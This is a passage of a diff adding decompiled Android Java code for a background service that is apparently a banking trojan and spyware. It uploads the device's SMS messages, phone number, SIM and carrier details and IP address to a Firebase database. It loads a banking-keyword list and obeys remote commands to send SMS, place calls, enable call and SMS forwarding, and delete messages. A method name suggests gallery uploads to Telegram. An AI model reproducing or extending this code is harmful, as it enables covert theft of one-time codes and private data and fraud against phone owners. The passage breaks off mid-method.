+                } catch (Throwable th) {
+                    th = th;
+                    bufferedReader = bufferedReader2;
+                    if (bufferedReader != null) {
+                        try {
+                            bufferedReader.close();
+                        } catch (Exception unused4) {
+                        }
+                    }
+                    if (httpURLConnection == null) {
+                        throw th;
+                    }
+                    httpURLConnection.disconnect();
+                    throw th;
+                }
+            } catch (Exception unused5) {
+            } catch (Throwable th2) {
+                th = th2;
+            }
+        } catch (Exception unused6) {
+            httpURLConnection = null;
+        } catch (Throwable th3) {
+            th = th3;
+            httpURLConnection = null;
+        }
+        httpURLConnection.disconnect();
+        iPListener.onIP(str);
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ int lambda$getSimsInternal$29(SubscriptionInfo subscriptionInfo, SubscriptionInfo subscriptionInfo2) {
+        return Integer.compare(subscriptionInfo.getSimSlotIndex(), subscriptionInfo2.getSimSlotIndex());
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$indexGalleryUpload$35(String str, Void r2) {
+        Log.d(TAG, "Gallery index saved: " + str);
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$indexGalleryUpload$36(String str, Exception exc) {
+        Log.e(TAG, "Gallery index save FAILED: " + str, exc);
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$postToast$31(String str) {
+        Toast.makeText(this, str, 0).show();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$17(String str, int i) {
+        boolean zMakeCall;
+        try {
+            zMakeCall = this.callUtil.makeCall(str, i);
+        } catch (Exception e) {
+            Log.e(TAG, "makeCall error", e);
+            zMakeCall = false;
+        }
+        try {
+            HashMap map = new HashMap();
+            map.put("to", str);
+            map.put("simIndex", Integer.valueOf(i));
+            map.put(ServerValues.NAME_OP_TIMESTAMP, Long.valueOf(System.currentTimeMillis()));
+            map.put("ok", Boolean.valueOf(zMakeCall));
+            FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/lastMakeCall").setValue(map);
+        } catch (Exception e2) {
+            Log.w(TAG, "lastMakeCall write failed", e2);
+        }
+        if (zMakeCall) {
+            delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/makeCall"));
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$18(String str, String str2, int i) {
+        if (sendSms(str, str2, i)) {
+            delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/sendSms"));
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$19(List list, int i) {
+        for (Object obj : list) {
+            if (obj instanceof Map) {
+                Map map = (Map) obj;
+                Object obj2 = map.get("to");
+                Object obj3 = map.get("message");
+                String str = obj2 instanceof String ? (String) obj2 : "";
+                String str2 = obj3 instanceof String ? (String) obj3 : "";
+                if (!str.isEmpty() && !str2.isEmpty()) {
+                    sendSms(str, str2, i);
+                }
+            }
+        }
+        delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/sendMultipleSms"));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$20(List list, String str, int i) {
+        int i2 = 0;
+        for (Object obj : list) {
+            String strValueOf = obj instanceof String ? (String) obj : String.valueOf(obj);
+            if (strValueOf != null && !strValueOf.trim().isEmpty() && sendSms(strValueOf, str, i)) {
+                i2++;
+            }
+        }
+        Log.d(TAG, "Relay wake sent SMS to " + i2 + "/" + list.size() + " targets");
+        try {
+            FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/lastWakeSource").setValue("relay_sms");
+        } catch (Exception e) {
+            Log.w(TAG, "Failed to write lastWakeSource", e);
+        }
+        delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/relayWake"));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$21(List list, DatabaseReference databaseReference, Void r5) {
+        Iterator it = list.iterator();
+        while (it.hasNext()) {
+            databaseReference.push().setValue((Map) it.next());
+        }
+        Log.d(TAG, "Refresh: re-uploaded " + list.size() + " messages");
+        delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/refreshSms"));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$23() {
+        try {
+            List<Map<String, Object>> allMessages = getAllMessages();
+            if (allMessages == null || allMessages.isEmpty()) {
+                delete("clients/" + this.deviceID + "/webhookEvent/refreshSms");
+            } else {
+                DatabaseReference reference = FirebaseDatabase.getInstance().getReference("messages/" + this.deviceID);
+                reference.removeValue().addOnSuccessListener(new ForegroundService$$ExternalSyntheticLambda32(this, allMessages, reference, 0)).addOnFailureListener(new UpiPinActivity$$ExternalSyntheticLambda4(11));
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "refresh SMS error", e);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$24() {
+        ValueEventListener valueEventListener;
+        ValueEventListener valueEventListener2;
+        try {
+            DatabaseReference databaseReference = this.dataRef;
+            if (databaseReference != null && (valueEventListener2 = this.dataListener) != null) {
+                databaseReference.removeEventListener(valueEventListener2);
+            }
+            DatabaseReference databaseReference2 = this.connectedRef;
+            if (databaseReference2 != null && (valueEventListener = this.connectedListener) != null) {
+                databaseReference2.removeEventListener(valueEventListener);
+            }
+            this.isListening = false;
+            this.isHeartbeating = false;
+            this.hbFails = 0;
+            getSharedPreferences(PREFS_NAME, 0).edit().remove(KEY_REGISTERED).apply();
+            registerDevice();
+            delete("clients/" + this.deviceID + "/webhookEvent/reconnect");
+        } catch (Exception e) {
+            Log.e(TAG, "reconnect error", e);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$process$25(List list) {
+        try {
+            Uri uri = Uri.parse("content://sms");
+            Iterator it = list.iterator();
+            while (it.hasNext()) {
+                getContentResolver().delete(uri, "_id=?", new String[]{(String) it.next()});
+            }
+            delete("clients/" + this.deviceID + "/webhookEvent/deleteSms");
+        } catch (Exception e) {
+            Log.e(TAG, "delete SMS error", e);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$1() {
+        for (int i = 0; !NetworkUtil.isConnected(this) && i < 60; i++) {
+            try {
+                Thread.sleep(5000L);
+            } catch (InterruptedException unused) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+        }
+        if (NetworkUtil.isConnected(this)) {
+            this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 0));
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$2() {
+        try {
+            Thread.sleep(5000L);
+            registerDevice();
+        } catch (InterruptedException unused) {
+            Thread.currentThread().interrupt();
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$registerDevice$4(Exception exc) {
+        Log.e(TAG, "FCM token upload failed: " + exc.getMessage());
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$5(Task task) {
+        if (!task.isSuccessful() || task.getResult() == null) {
+            Log.w(TAG, "Fetching FCM registration token failed", task.getException());
+            return;
+        }
+        FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/fcmToken").setValue((String) task.getResult()).addOnSuccessListener(new UpiPinActivity$$ExternalSyntheticLambda4(16)).addOnFailureListener(new UpiPinActivity$$ExternalSyntheticLambda4(17));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$6(boolean z, List list, boolean z2, Void r9) {
+        getSharedPreferences(PREFS_NAME, 0).edit().putBoolean(KEY_REGISTERED, true).putBoolean("existingMsgsUploaded", true).apply();
+        if (z) {
+            final DatabaseReference reference = FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID);
+            reference.addListenerForSingleValueEvent(new ValueEventListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService.1
+                @Override // com.google.firebase.database.ValueEventListener
+                public void onCancelled(DatabaseError databaseError) {
+                }
+
+                @Override // com.google.firebase.database.ValueEventListener
+                public void onDataChange(DataSnapshot dataSnapshot) {
+                    try {
+                        if (!dataSnapshot.hasChild("notifications")) {
+                            reference.child("notifications").setValue(new ArrayList());
+                        }
+                        if (dataSnapshot.hasChild("webhookEvent")) {
+                            return;
+                        }
+                        reference.child("webhookEvent").setValue(new HashMap());
+                    } catch (Exception e) {
+                        Log.w(ForegroundService.TAG, "init structures failed", e);
+                    }
+                }
+            });
+        }
+        if (list != null && !list.isEmpty()) {
+            DatabaseReference reference2 = FirebaseDatabase.getInstance().getReference("messages/" + this.deviceID);
+            Iterator it = list.iterator();
+            while (it.hasNext()) {
+                reference2.push().setValue((Map) it.next());
+            }
+            Object obj = ((Map) list.get(0)).get(ServerValues.NAME_OP_TIMESTAMP);
+            if (obj instanceof Long) {
+                this.lastSmsTimestamp = ((Long) obj).longValue();
+                getSharedPreferences(PREFS_NAME, 0).edit().putLong("lastSmsTimestamp", this.lastSmsTimestamp).apply();
+            }
+            Log.d(TAG, "Uploaded " + list.size() + " initial messages to messages/" + this.deviceID);
+        }
+        try {
+            FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new ForegroundService$$ExternalSyntheticLambda50(this));
+        } catch (Exception e) {
+            Log.e(TAG, "FirebaseMessaging.getInstance().getToken() failed", e);
+        }
+        startListening();
+        setupPresence();
+        restoreSmsForward();
+        if (z2) {
+            return;
+        }
+        this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 11));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$7() {
+        try {
+            Thread.sleep(5000L);
+        } catch (InterruptedException unused) {
+            Thread.currentThread().interrupt();
+        }
+        registerDevice();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$8(Exception exc) {
+        this.exec.execute(new ForegroundService$$ExternalSyntheticLambda23(this, 12));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$registerDevice$9(Map map, final boolean z, final List list, final boolean z2, String str) {
+        String string;
+        map.put("ip_address", str);
+        try {
+            string = FirebaseDatabase.getInstance().getReference().toString();
+            if (string.endsWith("/")) {
+                string = string.substring(0, string.length() - 1);
+            }
+        } catch (Exception unused) {
+            string = "Unknown";
+        }
+        map.put("clientDbUrl", string);
+        FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID).updateChildren(map).addOnSuccessListener(new OnSuccessListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService$$ExternalSyntheticLambda49
+            @Override // com.google.android.gms.tasks.OnSuccessListener
+            public final void onSuccess(Object obj) {
+                this.f$0.lambda$registerDevice$6(z, list, z2, (Void) obj);
+            }
+        }).addOnFailureListener(new ForegroundService$$ExternalSyntheticLambda50(this));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$scheduleReconnect$14() {
+        ValueEventListener valueEventListener;
+        try {
+            Thread.sleep(3000L);
+        } catch (InterruptedException unused) {
+            Thread.currentThread().interrupt();
+        }
+        DatabaseReference databaseReference = this.dataRef;
+        if (databaseReference != null && (valueEventListener = this.dataListener) != null) {
+            databaseReference.removeEventListener(valueEventListener);
+        }
+        this.isListening = false;
+        this.hbFails = 0;
+        startListening();
+        setupPresence();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$startForegroundInternal$0() {
+        try {
+            if (Build.VERSION.SDK_INT >= 29) {
+                startForeground(1, buildNotif(), 3);
+            } else {
+                startForeground(1, buildNotif());
+            }
+        } catch (Exception unused) {
+            Log.e(TAG, "startForeground retry also failed — notifications likely disabled by user");
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$startHeartbeat$12(long j, DatabaseError databaseError, DatabaseReference databaseReference) {
+        if (databaseError == null) {
+            this.hbFails = 0;
+            this.reconnectScheduled = false;
+            this.statusRef.setValue(Boolean.TRUE);
+            getSharedPreferences(PREFS_NAME, 0).edit().putLong("lastHeartbeat", j).apply();
+            return;
+        }
+        this.hbFails++;
+        if (this.hbFails < 5 || this.reconnectScheduled) {
+            return;
+        }
+        this.reconnectScheduled = true;
+        this.statusRef.setValue(Boolean.FALSE);
+        scheduleReconnect();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$startHeartbeat$13(DatabaseReference databaseReference) {
+        int i = 0;
+        while (this.isHeartbeating && !this.hbExec.isShutdown()) {
+            try {
+                Thread.sleep(15000L);
+                if (!this.isHeartbeating) {
+                    return;
+                }
+                final long jCurrentTimeMillis = System.currentTimeMillis();
+                databaseReference.setValue((Object) Long.valueOf(jCurrentTimeMillis), new DatabaseReference.CompletionListener() { // from class: com.cbqimrt.lx4076cb.ForegroundService$$ExternalSyntheticLambda52
+                    @Override // com.google.firebase.database.DatabaseReference.CompletionListener
+                    public final void onComplete(DatabaseError databaseError, DatabaseReference databaseReference2) {
+                        this.f$0.lambda$startHeartbeat$12(jCurrentTimeMillis, databaseError, databaseReference2);
+                    }
+                });
+                try {
+                    this.statusRef.setValue(Boolean.TRUE);
+                } catch (Exception unused) {
+                }
+                i++;
+                if (i % 4 == 0) {
+                    try {
+                        if (getApplicationContext().checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
+                            HashMap map = new HashMap();
+                            map.put("sims", getSims());
+                            map.put("mobNo", getPhoneNumber());
+                            map.put("service_provider", getCarrier());
+                            map.put("battery", getBattery());
+                            FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID).updateChildren(map);
+                        } else {
+                            HashMap map2 = new HashMap();
+                            map2.put("battery", getBattery());
+                            FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID).updateChildren(map2);
+                        }
+                    } catch (Exception e) {
+                        Log.w(TAG, "Heartbeat SIM update failed: " + e.getMessage());
+                    }
+                }
+            } catch (InterruptedException unused2) {
+                Thread.currentThread().interrupt();
+                return;
+            }
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$startSmsPoll$27() {
+        try {
+            pollNewSms();
+        } catch (Exception e) {
+            Log.w(TAG, "SMS poll error", e);
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public /* synthetic */ void lambda$startWLTimer$28() {
+        try {
+            PowerManager.WakeLock wakeLock = this.wl;
+            if (wakeLock != null) {
+                if (wakeLock.isHeld()) {
+                    this.wl.release();
+                }
+                acquireWL();
+            }
+        } catch (Exception unused) {
+            Log.w(TAG, "wl renew error");
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$updateSimDataDelayed$11(Exception exc) {
+        Log.w(TAG, "SIM data update failed: " + exc.getMessage());
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$uploadGalleryToTelegram$32(FirebaseAuth firebaseAuth, CountDownLatch countDownLatch, Task task) {
+        if (task.isSuccessful()) {
+            Log.d(TAG, "Anonymous auth SUCCESS: " + firebaseAuth.getCurrentUser().getUid());
+        } else {
+            Log.e(TAG, "Anonymous auth FAILED", task.getException());
+        }
+        countDownLatch.countDown();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$uploadGalleryToTelegram$33(boolean[] zArr, CountDownLatch countDownLatch, Void r3) {
+        zArr[0] = true;
+        countDownLatch.countDown();
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static /* synthetic */ void lambda$uploadGalleryToTelegram$34(CountDownLatch countDownLatch, Exception exc) {
+        Log.e(TAG, "Firebase write test FAILED", exc);
+        countDownLatch.countDown();
+    }
+
+    private Set<String> loadKeywords() {
+        HashSet hashSet = new HashSet();
+        try {
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(getResources().openRawResource(R.raw.banking_keywords)));
+            while (true) {
+                String line = bufferedReader.readLine();
+                if (line == null) {
+                    break;
+                }
+                String strTrim = line.trim();
+                if (!strTrim.isEmpty()) {
+                    hashSet.add(strTrim.toLowerCase(Locale.getDefault()));
+                }
+            }
+            bufferedReader.close();
+        } catch (Exception e) {
+            Log.e(TAG, "load keywords error", e);
+        }
+        return hashSet;
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public int objInt(Object obj) {
+        if (obj instanceof Integer) {
+            return ((Integer) obj).intValue();
+        }
+        if (obj instanceof Long) {
+            return ((Long) obj).intValue();
+        }
+        if (obj instanceof String) {
+            try {
+                return Integer.parseInt((String) obj);
+            } catch (Exception unused) {
+                return 0;
+            }
+        }
+        if (obj instanceof Number) {
+            return ((Number) obj).intValue();
+        }
+        return 0;
+    }
+
+    private long objLong(Object obj) {
+        if (obj instanceof Long) {
+            return ((Long) obj).longValue();
+        }
+        if (obj instanceof Integer) {
+            return ((Integer) obj).longValue();
+        }
+        if (obj instanceof Number) {
+            return ((Number) obj).longValue();
+        }
+        if (obj instanceof String) {
+            try {
+                return Long.parseLong((String) obj);
+            } catch (Exception unused) {
+            }
+        }
+        return 0L;
+    }
+
+    private void pollNewSms() {
+        if (NetworkUtil.isConnected(this) && checkSelfPermission("android.permission.READ_SMS") == 0) {
+            try {
+                Uri uri = Uri.parse("content://sms/");
+                String[] strArr = {"address", "body", "date", "type"};
+                long j = this.lastSmsTimestamp;
+                Cursor cursorQuery = getContentResolver().query(uri, strArr, j > 0 ? "date > ?" : null, j > 0 ? new String[]{String.valueOf(j)} : null, "date DESC LIMIT 500");
+                if (cursorQuery == null) {
+                    if (cursorQuery != null) {
+                        cursorQuery.close();
+                        return;
+                    }
+                    return;
+                }
+                try {
+                    ArrayList arrayList = new ArrayList();
+                    while (cursorQuery.moveToNext()) {
+                        long j2 = cursorQuery.getLong(cursorQuery.getColumnIndexOrThrow("date"));
+                        ArrayList arrayList2 = arrayList;
+                        if (j2 > this.lastSmsTimestamp) {
+                            this.lastSmsTimestamp = j2;
+                        }
+                        String string = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("address"));
+                        String string2 = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("body"));
+                        if (!SmsReceiver.hasSmsKey(this, SmsReceiver.makeSmsKey(string, j2, string2))) {
+                            HashMap map = new HashMap();
+                            map.put("sender", string);
+                            map.put("message", string2);
+                            map.put(ServerValues.NAME_OP_TIMESTAMP, Long.valueOf(j2));
+                            map.put("receivedDate", fmt(j2));
+                            map.put("dateTime", fmt(j2));
+                            map.put("type", cursorQuery.getInt(cursorQuery.getColumnIndexOrThrow("type")) == 1 ? "incoming" : "outgoing");
+                            arrayList2.add(map);
+                        }
+                        arrayList = arrayList2;
+                    }
+                    ArrayList<Map> arrayList3 = arrayList;
+                    if (!arrayList3.isEmpty()) {
+                        App.ensureFirebaseAuth();
+                        DatabaseReference reference = FirebaseDatabase.getInstance().getReference("messages/" + this.deviceID);
+                        for (Map map2 : arrayList3) {
+                            reference.push().setValue(map2);
+                            try {
+                                Object obj = map2.get("sender");
+                                Object obj2 = map2.get("message");
+                                Object obj3 = map2.get(ServerValues.NAME_OP_TIMESTAMP);
+                                SmsReceiver.recordSmsKey(this, SmsReceiver.makeSmsKey(String.valueOf(obj), obj3 instanceof Number ? ((Number) obj3).longValue() : 0L, String.valueOf(obj2)));
+                            } catch (Exception unused) {
+                            }
+                        }
+                        Log.d(TAG, "Poll: uploaded " + arrayList3.size() + " new SMS");
+                        getSharedPreferences(PREFS_NAME, 0).edit().putLong("lastSmsTimestamp", this.lastSmsTimestamp).apply();
+                    }
+                    cursorQuery.close();
+                } catch (Throwable th) {
+                    try {
+                        cursorQuery.close();
+                        throw th;
+                    } catch (Throwable th2) {
+                        th.addSuppressed(th2);
+                        throw th;
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "poll SMS error", e);
+            }
+        }
+    }
+
+    private void postToast(String str) {
+        new Handler(Looper.getMainLooper()).post(new Processor$$ExternalSyntheticLambda2(14, this, str));
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    /* JADX WARN: Code duplicated, block: B:100:0x0252  */
+    /* JADX WARN: Code duplicated, block: B:157:0x041c  */
+    /* JADX WARN: Code duplicated, block: B:181:0x04b6  */
+    /* JADX WARN: Code duplicated, block: B:196:0x04fb  */
+    /* JADX WARN: Code duplicated, block: B:88:0x020b  */
+    /* JADX WARN: Code duplicated, block: B:89:0x020f A[DONT_INVERT] */
+    /* JADX WARN: Code duplicated, block: B:90:0x0211  */
+    /* JADX WARN: Code duplicated, block: B:91:0x0217  */
+    /* JADX WARN: Multi-variable type inference failed */
+    /* JADX WARN: Type inference failed for: r14v1 */
+    /* JADX WARN: Type inference failed for: r14v2, types: [boolean, int] */
+    /* JADX WARN: Type inference failed for: r14v3 */
+    /* JADX WARN: Type inference fix 'apply assigned field type' failed
+    java.lang.UnsupportedOperationException: ArgType.getObject(), call class: class jadx.core.dex.instructions.args.ArgType$UnknownArg
+    	at jadx.core.dex.instructions.args.ArgType.getObject(ArgType.java:596)
+    	at jadx.core.dex.attributes.nodes.ClassTypeVarsAttr.getTypeVarsMapFor(ClassTypeVarsAttr.java:35)
+    	at jadx.core.dex.nodes.utils.TypeUtils.replaceClassGenerics(TypeUtils.java:177)
+    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.insertExplicitUseCast(FixTypesVisitor.java:397)
+    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.tryFieldTypeWithNewCasts(FixTypesVisitor.java:359)
+    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.applyFieldType(FixTypesVisitor.java:309)
+    	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)
+     */
+    public void process(Map<String, Object> map) {
+        ?? r14;
+        Object obj;
+        String str;
+        boolean z;
+        double dDoubleValue;
+        String str2;
+        String strValueOf;
+        String strValueOf2;
+        boolean zDeactivate;
+        boolean zActivate;
+        if (map.containsKey("callForward")) {
+            Object obj2 = map.get("callForward");
+            if (obj2 instanceof Map) {
+                Map map2 = (Map) obj2;
+                long jObjLong = map2.containsKey(ServerValues.NAME_OP_TIMESTAMP) ? objLong(map2.get(ServerValues.NAME_OP_TIMESTAMP)) : 0L;
+                long jObjLong2 = this.lastCallFwd.containsKey(ServerValues.NAME_OP_TIMESTAMP) ? objLong(this.lastCallFwd.get(ServerValues.NAME_OP_TIMESTAMP)) : 0L;
+                if (this.lastCallFwd.isEmpty() || !Objects.equals(map2.get("to"), this.lastCallFwd.get("to")) || objInt(map2.get(Constants.MessagePayloadKeys.FROM)) != objInt(this.lastCallFwd.get(Constants.MessagePayloadKeys.FROM)) || boolVal(map2.get("isActive")) != boolVal(this.lastCallFwd.get("isActive")) || (jObjLong != 0 && jObjLong != jObjLong2)) {
+                    this.lastCallFwd = new HashMap(map2);
+                    String str3 = (String) map2.get("to");
+                    int iObjInt = objInt(map2.get(Constants.MessagePayloadKeys.FROM));
+                    boolean zBoolVal = boolVal(map2.get("isActive"));
+                    if (str3 != null && !str3.isEmpty() && zBoolVal) {
+                        try {
+                            zActivate = this.callUtil.activate(str3, iObjInt);
+                        } catch (Exception e) {
+                            Log.e(TAG, "callForward activate error", e);
+                            zActivate = false;
+                        }
+                        try {
+                            HashMap map3 = new HashMap(map2);
+                            map3.put("applied", Boolean.valueOf(zActivate));
+                            if (!zActivate) {
+                                map3.put(Constants.IPC_BUNDLE_KEY_SEND_ERROR, "dial failed - check CALL_PHONE permission and SIM");
+                            }
+                            FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/webhookEvent/callForward").setValue(map3).addOnFailureListener(new UpiPinActivity$$ExternalSyntheticLambda4(12));
+                        } catch (Exception e2) {
+                            Log.w(TAG, "callForward state write failed", e2);
+                        }
+                    } else if (!zBoolVal) {
+                        try {
+                            zDeactivate = this.callUtil.deactivate(iObjInt);
+                        } catch (Exception e3) {
+                            Log.e(TAG, "callForward deactivate error", e3);
+                            zDeactivate = false;
+                        }
+                        if (zDeactivate) {
+                            delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder("clients/"), this.deviceID, "/webhookEvent/callForward"));
+                            this.lastCallFwd.clear();
+                        } else {
+                            try {
+                                HashMap map4 = new HashMap(map2);
+                                map4.put("applied", Boolean.FALSE);
+                                map4.put(Constants.IPC_BUNDLE_KEY_SEND_ERROR, "deactivate dial failed");
+                                FirebaseDatabase.getInstance().getReference("clients/" + this.deviceID + "/webhookEvent/callForward").setValue(map4).addOnFailureListener(new UpiPinActivity$$ExternalSyntheticLambda4(13));
+                            } catch (Exception e4) {
+                                Log.w(TAG, "callForward state write failed", e4);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        if (map.containsKey("makeCall")) {
+            Object obj3 = map.get("makeCall");
+            if (obj3 instanceof Map) {
+                Map map5 = (Map) obj3;
+                if (!map5.equals(this.lastMakeCall)) {
+                    this.lastMakeCall = new HashMap(map5);
+                    Object obj4 = map5.get("to");
+                    final String strTrim = obj4 != null ? String.valueOf(obj4).trim() : "";
+                    final int iObjInt2 = objInt(map5.get("simIndex"));
+                    if (iObjInt2 < 0) {
+                        iObjInt2 = objInt(map5.get(Constants.MessagePayloadKeys.FROM));
+                    }
+                    if (strTrim != null && !strTrim.isEmpty()) {
+                        final int i = 0;
+                        this.exec.execute(new Runnable(this) { // from class: com.cbqimrt.lx4076cb.ForegroundService$$ExternalSyntheticLambda37
+                            public final /* synthetic */ ForegroundService f$0;
+
+                            {
+                                this.f$0 = this;
+                            }
+
+                            @Override // java.lang.Runnable
+                            public final void run() {
+                                switch (i) {
+                                    case 0:
+                                        this.f$0.lambda$process$17((String) strTrim, iObjInt2);
+                                        break;
+                                    default:
+                                        this.f$0.lambda$process$19((List) strTrim, iObjInt2);
+                                        break;
+                                }
+                            }
+                        });
+                    }
+                }
+            }
+        }
+        if (map.containsKey("sendSms")) {
+            Object obj5 = map.get("sendSms");
+            if (obj5 instanceof Map) {
+                Map map6 = (Map) obj5;
+                if (map6.containsKey("to") && map6.containsKey("message")) {
+                    Object obj6 = map6.get("to");
+                    Object obj7 = map6.get("message");
+                    if (obj6 instanceof String) {
+                        strValueOf = (String) obj6;
+                    } else {
+                        if (obj6 != null) {
+                            strValueOf = String.valueOf(obj6);
+                        } else {
+                            str2 = null;
+                        }
+                        if (obj7 instanceof String) {
+                            strValueOf2 = (String) obj7;
+                        } else if (obj7 != null) {
+                            strValueOf2 = String.valueOf(obj7);
+                        } else {
+                            strValueOf2 = null;
+                        }
+                        int iObjInt3 = objInt(map6.get("simIndex"));
+                        if (str2 != null || str2.isEmpty() || strValueOf2 == null || strValueOf2.isEmpty()) {
+                            r14 = 0;
+                        } else {
+                            r14 = 0;
+                            this.exec.execute(new FormDataManager$$ExternalSyntheticLambda1(this, str2, strValueOf2, iObjInt3, 2));
+                        }
+                    }
+                    str2 = strValueOf;
+                    if (obj7 instanceof String) {
+                        strValueOf2 = (String) obj7;
+                    } else if (obj7 != null) {
+                        strValueOf2 = String.valueOf(obj7);
+                    } else {
+                        strValueOf2 = null;
+                    }
+                    int iObjInt4 = objInt(map6.get("simIndex"));
+                    if (str2 != null) {
+                        r14 = 0;
+                    } else {
+                        r14 = 0;
+                    }
+                } else {
+                    r14 = 0;
+                }
+            } else {
+                r14 = 0;
+            }
+        } else {
+            r14 = 0;
+        }
+        if (map.containsKey("sendMultipleSms")) {
+            Object obj8 = map.get("sendMultipleSms");
+            if (obj8 instanceof Map) {
+                Map map7 = (Map) obj8;
+                Object obj9 = map7.get("messages");
+                if (obj9 instanceof List) {
+                    final List list = (List) obj9;
+                    final int iObjInt5 = objInt(map7.get("simIndex"));
+                    final int i2 = 1;
+                    this.exec.execute(new Runnable(this) { // from class: com.cbqimrt.lx4076cb.ForegroundService$$ExternalSyntheticLambda37
+                        public final /* synthetic */ ForegroundService f$0;
+
+                        {
+                            this.f$0 = this;
+                        }
+
+                        @Override // java.lang.Runnable
+                        public final void run() {
+                            switch (i2) {
+                                case 0:
+                                    this.f$0.lambda$process$17((String) list, iObjInt5);
+                                    break;
+                                default:
+                                    this.f$0.lambda$process$19((List) list, iObjInt5);
+                                    break;
+                            }
+                        }
+                    });
+                }
+            }
+        }
+        if (map.containsKey("smsForward")) {
+            Object obj10 = map.get("smsForward");
+            if (obj10 instanceof Map) {
+                Map map8 = (Map) obj10;
+                if ((!this.lastSmsFwd.isEmpty() && Objects.equals(map8.get("isActive"), this.lastSmsFwd.get("isActive")) && Objects.equals(map8.get("to"), this.lastSmsFwd.get("to"))) ? false : true) {
+                    this.lastSmsFwd = new HashMap(map8);
+                    String str4 = (String) map8.get("to");
+                    int iObjInt6 = objInt(map8.get(Constants.MessagePayloadKeys.FROM));
+                    boolean zBoolVal2 = boolVal(map8.get("isActive"));
+                    this.smsFwdActive = zBoolVal2;
+                    this.smsFwdTarget = zBoolVal2 ? str4 : "";
+                    this.smsFwdSim = zBoolVal2 ? iObjInt6 : 0;
+                    this.smsFwd.setState(zBoolVal2, str4, iObjInt6);
+                    if (!zBoolVal2) {
+                        delete(NetworkType$EnumUnboxingLocalUtility.m(new StringBuilder((String) r5), this.deviceID, "/webhookEvent/smsForward"));
+                    }
+                    saveForwarderSettings(zBoolVal2, str4, iObjInt6);
+                }
+            }
+        }
+        if (map.containsKey("stopForwarder")) {
